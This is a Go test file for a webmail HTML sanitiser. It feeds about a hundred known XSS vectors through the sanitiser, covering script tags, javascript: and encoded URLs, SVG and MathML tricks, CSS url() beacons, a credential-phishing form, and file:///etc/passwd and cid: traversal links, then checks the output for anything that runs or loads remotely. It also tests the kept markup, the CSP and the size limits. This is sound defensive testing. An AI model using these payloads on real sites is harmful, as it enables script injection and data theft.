package message

import (
	"strings"
	"testing"

	"golang.org/x/net/html"
)

// dangerous finds what must never be in a sanitised view, by parsing the
// output the way a browser would and looking at the tree, not at the text:
// an element or attribute that is not on the allowlist, a URL with a scheme
// that runs or loads something, a style that reaches outside.
func dangerous(t *testing.T, out string, remote bool) []string {
	t.Helper()
	doc, err := html.Parse(strings.NewReader(out))
	if err != nil {
		t.Fatalf("output does not parse: %v", err)
	}
	var bad []string
	var walk func(n *html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.CommentNode {
			bad = append(bad, "comment")
		}
		if n.Type == html.ElementNode {
			// html, head and body are what the parser adds around a fragment.
			if !viewElements[n.Data] && n.Data != "html" && n.Data != "head" && n.Data != "body" {
				bad = append(bad, "<"+n.Data+">")
			}
			if n.Namespace != "" {
				bad = append(bad, "namespace "+n.Namespace)
			}
			for _, a := range n.Attr {
				key := strings.ToLower(a.Key)
				val := strings.ToLower(strings.Join(strings.Fields(a.Val), ""))
				switch {
				case strings.HasPrefix(key, "on"):
					bad = append(bad, "handler "+key)
				case key == "href":
					if !strings.HasPrefix(val, "http://") && !strings.HasPrefix(val, "https://") && !strings.HasPrefix(val, "mailto:") {
						bad = append(bad, "href "+a.Val)
					}
				case key == "src":
					ok := strings.HasPrefix(val, "data:image/")
					if remote {
						ok = ok || strings.HasPrefix(val, "http://") || strings.HasPrefix(val, "https://")
					}
					if !ok || strings.Contains(val, "svg") {
						bad = append(bad, "src "+a.Val)
					}
				case key == "style":
					for _, word := range []string{"url(", "expression", "javascript", "import", "behavior", "binding", "\\", "position", "var("} {
						if strings.Contains(val, word) {
							bad = append(bad, "style "+a.Val)
						}
					}
				case key == "target", key == "rel", key == "referrerpolicy":
				default:
					if !viewAttrs[key] {
						bad = append(bad, "attribute "+key)
					}
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)
	return bad
}

// Known XSS vectors, most of them from the OWASP filter evasion cheat
// sheet and the test suites of HTML sanitisers. None may leave anything
// that runs, and none may load anything remote.
var xssVectors = []string{
	`<script>alert(1)</script>`,
	`<SCRIPT SRC=http://evil.test/xss.js></SCRIPT>`,
	`<scr<script>ipt>alert(1)</scr</script>ipt>`,
	`<script/xss src="http://evil.test/x.js"></script>`,
	`<<SCRIPT>alert("XSS");//<</SCRIPT>`,
	`<img src=x onerror=alert(1)>`,
	`<img src="javascript:alert(1)">`,
	`<IMG SRC=JaVaScRiPt:alert('XSS')>`,
	`<IMG SRC=javascript&#58;alert('XSS')>`,
	`<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
	`<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
	"<IMG SRC=\"jav\tascript:alert('XSS');\">",
	"<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
	"<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
	`<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`,
	`<IMG SRC="x" ONERROR="alert(1)" onload=alert(2) OnMouseOver=alert(3)>`,
	`<img src=x:alert(1) onerror=eval(src)>`,
	`<img srcset="http://evil.test/a.png 1x, http://evil.test/b.png 2x">`,
	`<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`,
	`<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`,
	`<img src="//evil.test/track.gif">`,
	`<img src="http://evil.test/track.gif" width=1 height=1>`,
	`<img src="https://evil.test/track.gif">`,
	`<img dynsrc="javascript:alert(1)" lowsrc="javascript:alert(1)">`,
	`<a href="javascript:alert(1)">x</a>`,
	`<a href="JAVASCRIPT:alert(1)">x</a>`,
	"<a href=\"java\nscript:alert(1)\">x</a>",
	`<a href="&#106;avascript:alert(1)">x</a>`,
	`<a href="  javascript:alert(1)">x</a>`,
	`<a href="vbscript:msgbox(1)">x</a>`,
	`<a href="data:text/html,<script>alert(1)</script>">x</a>`,
	`<a href="file:///etc/passwd">x</a>`,
	`<a href="//evil.test">x</a>`,
	`<a href="/relative">x</a>`,
	`<a href="http://ok.test" onclick="alert(1)" target="_top">x</a>`,
	`<a xlink:href="javascript:alert(1)">x</a>`,
	`<svg onload=alert(1)>`,
	`<svg><script>alert(1)</script></svg>`,
	`<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
	`<svg><style><img src=x onerror=alert(1)></style></svg>`,
	`<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>`,
	`<math><mi xlink:href="javascript:alert(1)">x</mi></math>`,
	`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
	`<iframe src="javascript:alert(1)"></iframe>`,
	`<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
	`<object data="javascript:alert(1)"></object>`,
	`<embed src="http://evil.test/x.swf">`,
	`<applet code="x"></applet>`,
	`<form action="http://evil.test"><input name=password><button>Go</button></form>`,
	`<input type="image" src="x" onerror="alert(1)">`,
	`<isindex action="javascript:alert(1)" type=image>`,
	`<body onload=alert(1)>`,
	`<body background="javascript:alert(1)">`,
	`<table background="http://evil.test/t.gif"><tr><td background="javascript:alert(1)">x</td></tr></table>`,
	`<link rel="stylesheet" href="http://evil.test/x.css">`,
	`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
	`<meta http-equiv="Set-Cookie" content="a=b">`,
	`<base href="http://evil.test/">`,
	`<style>@import "http://evil.test/x.css";</style>`,
	`<style>body{background:url("http://evil.test/t.gif")}</style>`,
	`<style><!--</style><script>alert(1)//--></style>`,
	`<div style="background:url(http://evil.test/t.gif)">x</div>`,
	`<div style="background-image: url(javascript:alert(1))">x</div>`,
	`<div style="width: expression(alert(1))">x</div>`,
	`<div style="behavior: url(x.htc)">x</div>`,
	`<div style="-moz-binding: url(http://evil.test/x.xml#x)">x</div>`,
	`<div style="color: red; background: u\rl(http://evil.test/x)">x</div>`,
	`<div style="background:\75rl(http://evil.test/x)">x</div>`,
	`<div style="color:red;/**/background:url(http://evil.test/x)">x</div>`,
	`<div style="position:fixed;top:0;left:0;width:100%;height:100%">x</div>`,
	`<div style="font-family: var(--x)">x</div>`,
	`<div style="background: image-set('http://evil.test/x' 1x)">x</div>`,
	`<div style="list-style-image: url(http://evil.test/x)">x</div>`,
	`<div style="color: red&#59; background: url(http://evil.test/x)">x</div>`,
	`<p style="x:expr/**/ession(alert(1))">x</p>`,
	`<video src=x onerror=alert(1)><source onerror=alert(1)></video>`,
	`<audio src="http://evil.test/a.mp3" autoplay>`,
	`<details open ontoggle=alert(1)>x</details>`,
	`<marquee onstart=alert(1)>x</marquee>`,
	`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
	`<template><script>alert(1)</script></template>`,
	`<textarea><script>alert(1)</script></textarea>`,
	`<title><img src=x onerror=alert(1)></title>`,
	`<xmp><script>alert(1)</script></xmp>`,
	`<plaintext><script>alert(1)</script>`,
	`<!--[if gte IE 4]><script>alert(1)</script><![endif]-->`,
	`<!--><script>alert(1)</script>-->`,
	`<![CDATA[<script>alert(1)</script>]]>`,
	`<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>`,
	`<div id="x" class="y" name="z" contenteditable autofocus onfocus=alert(1)>x</div>`,
	`<a href="http://ok.test" style="display:block" id=location name=cookie>x</a>`,
	`<img src="cid:../../../etc/passwd">`,
	`<img src="cid:evil">`,
	`"><script>alert(1)</script>`,
	`<p title="a" title='"><script>alert(1)</script>'>x</p>`,
	"<p title=\"`onmouseover=alert(1)\">x</p>",
	`<a href="http://ok.test/?q=<script>alert(1)</script>">x</a>`,
	`<a href='http://ok.test/"onmouseover="alert(1)'>x</a>`,
}

func TestSanitizeXSSVectors(t *testing.T) {
	// A hostile resolver for cid: images.
	evilCID := func(string) string { return "javascript:alert(1)" }
	for _, in := range xssVectors {
		for _, opt := range []ViewOptions{{}, {RemoteImages: true}, {CID: evilCID}} {
			v := SanitizeHTML(in, opt)
			if bad := dangerous(t, v.HTML, opt.RemoteImages); len(bad) > 0 {
				t.Errorf("%q\n  became %q\n  which has %q", in, v.HTML, bad)
			}
			low := strings.ToLower(v.HTML)
			if strings.Contains(low, "<script") || strings.Contains(low, "<style") {
				t.Errorf("%q\n  became %q", in, v.HTML)
			}
		}
	}
}

// What stays: the markup mail is made of.
func TestSanitizeKeeps(t *testing.T) {
	for _, tc := range []struct{ name, in, want string }{
		{"text", `Hello <b>bold</b> &amp; <i>italic</i>`, `Hello <b>bold</b> &amp; <i>italic</i>`},
		{"escaping", `a &lt; b > c "q"`, `a &lt; b &gt; c &#34;q&#34;`},
		{"link", `<a href="https://example.test/a?b=1&amp;c=2">link</a>`,
			`<a href="https://example.test/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer nofollow">link</a>`},
		{"mailto", `<a href="mailto:a@example.test">mail</a>`,
			`<a href="mailto:a@example.test" target="_blank" rel="noopener noreferrer nofollow">mail</a>`},
		{"table", `<table width="600" cellpadding="0" border="0"><tr><td align="center" bgcolor="#ffffff" colspan="2">x</td></tr></table>`,
			`<table width="600" cellpadding="0" border="0"><tbody><tr><td align="center" bgcolor="#ffffff" colspan="2">x</td></tr></tbody></table>`},
		{"style", `<span style="color: #333; font-size:14px; font-family: Arial, 'Helvetica Neue', sans-serif; margin-top: 4px">x</span>`,
			`<span style="color: #333; font-size: 14px; font-family: Arial, &#39;Helvetica Neue&#39;, sans-serif; margin-top: 4px">x</span>`},
		{"rgb", `<p style="background-color: rgb(1, 2, 3); color: RGBA(0,0,0,.5)">x</p>`,
			`<p style="background-color: rgb(1, 2, 3); color: RGBA(0,0,0,.5)">x</p>`},
		{"one bad declaration", `<p style="color:red; background:url(http://evil.test/x); font-weight:bold">x</p>`,
			`<p style="color: red; font-weight: bold">x</p>`},
		{"unknown elements are unwrapped", `<custom-tag><p>para</p></custom-tag><center>c</center>`, `<p>para</p><center>c</center>`},
		{"document", `<!DOCTYPE html><html><head><title>t</title></head><body bgcolor="red"><p>x</p></body></html>`, `<p>x</p>`},
		{"lists", `<ul><li>a<li>b</ul><ol start="3"><li>c</ol>`, `<ul><li>a</li><li>b</li></ul><ol start="3"><li>c</li></ol>`},
		{"quote", `<blockquote><p>quoted</p></blockquote><br><hr>`, `<blockquote><p>quoted</p></blockquote><br><hr>`},
		{"data image", `<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot" width="1">`,
			`<img src="data:image/png;base64,iVBORw0KGgo=" referrerpolicy="no-referrer" alt="dot" width="1">`},
		{"unclosed", `<div><p>one<p>two`, `<div><p>one</p><p>two</p></div>`},
	} {
		if got := SanitizeHTML(tc.in, ViewOptions{}).HTML; got != tc.want {
			t.Errorf("%s:\n got %s\nwant %s", tc.name, got, tc.want)
		}
	}
}

// Remote images: off unless asked for, and the view says when it left one
// out, so the webmail can offer to load them.
func TestSanitizeRemoteImages(t *testing.T) {
	in := `<p>Hi</p><img src="https://cdn.example.test/logo.png" alt="Logo"><img src="http://cdn.example.test/pixel.gif">`
	v := SanitizeHTML(in, ViewOptions{})
	if !v.BlockedRemote || strings.Contains(v.HTML, "cdn.example.test") {
		t.Errorf("remote images off: blocked %v, %s", v.BlockedRemote, v.HTML)
	}
	if !strings.Contains(v.HTML, `<img alt="Logo">`) {
		t.Errorf("the image lost more than its source: %s", v.HTML)
	}
	v = SanitizeHTML(in, ViewOptions{RemoteImages: true})
	if v.BlockedRemote || !strings.Contains(v.HTML, `src="https://cdn.example.test/logo.png"`) ||
		!strings.Contains(v.HTML, `src="http://cdn.example.test/pixel.gif"`) {
		t.Errorf("remote images on: blocked %v, %s", v.BlockedRemote, v.HTML)
	}
	if v := SanitizeHTML(`<p>no images</p>`, ViewOptions{}); v.BlockedRemote {
		t.Error("blocked without an image")
	}
}

// cid: images come from the message itself, through the resolver, as data:
// URLs; an unknown id and a resolver that returns something else lose the
// source.
func TestSanitizeCID(t *testing.T) {
	resolve := func(cid string) string {
		if cid == "logo@example.test" {
			return "data:image/png;base64,iVBORw0KGgo="
		}
		return ""
	}
	v := SanitizeHTML(`<img src="cid:logo@example.test"><img src="CID:logo%40example.test"><img src="cid:other">`, ViewOptions{CID: resolve})
	if n := strings.Count(v.HTML, `src="data:image/png;base64,iVBORw0KGgo="`); n != 2 || v.BlockedRemote {
		t.Errorf("%d resolved, blocked %v: %s", n, v.BlockedRemote, v.HTML)
	}
	if strings.Contains(v.HTML, "cid:") {
		t.Errorf("a cid: URL is left: %s", v.HTML)
	}
}

// The Content-Security-Policy of a view: no script, no remote loads, a
// sandbox; images over the network only on request.
func TestViewCSP(t *testing.T) {
	csp := ViewCSP(false)
	for _, want := range []string{"default-src 'none'", "img-src data:;", "sandbox", "form-action 'none'", "frame-ancestors 'self'"} {
		if !strings.Contains(csp, want) {
			t.Errorf("CSP lacks %q: %s", want, csp)
		}
	}
	for _, not := range []string{"script-src", "allow-scripts", "allow-same-origin", "http", "*"} {
		if strings.Contains(csp, not) {
			t.Errorf("CSP has %q: %s", not, csp)
		}
	}
	if csp := ViewCSP(true); !strings.Contains(csp, "img-src data: https: http:;") || strings.Contains(csp, "script") {
		t.Errorf("CSP with remote images: %s", csp)
	}
	doc := ViewDocument("<p>x</p>")
	if !strings.HasPrefix(doc, "<!doctype html>") || !strings.Contains(doc, `<meta charset="utf-8">`) || strings.Contains(doc, "<script") {
		t.Errorf("document: %s", doc)
	}
	if got := TextView("a <b> & c"); got != "<pre>a &lt;b&gt; &amp; c</pre>" {
		t.Errorf("TextView: %s", got)
	}
}

// Hostile size and depth.
func TestSanitizeLimits(t *testing.T) {
	deep := strings.Repeat("<div>", 100000) + "x"
	v := SanitizeHTML(deep, ViewOptions{})
	if n := strings.Count(v.HTML, "<div>"); n > maxViewDepth+1 {
		t.Errorf("%d nested elements kept", n)
	}
	huge := strings.Repeat("<p>x</p>", maxViewInput/4)
	if v := SanitizeHTML(huge, ViewOptions{}); len(v.HTML) > maxViewInput+100 {
		t.Errorf("output of %d bytes", len(v.HTML))
	}
	long := `<p title="` + strings.Repeat("a", maxAttrLen+1) + `">x</p>`
	if got := SanitizeHTML(long, ViewOptions{}).HTML; got != "<p>x</p>" {
		t.Errorf("long attribute kept")
	}
}
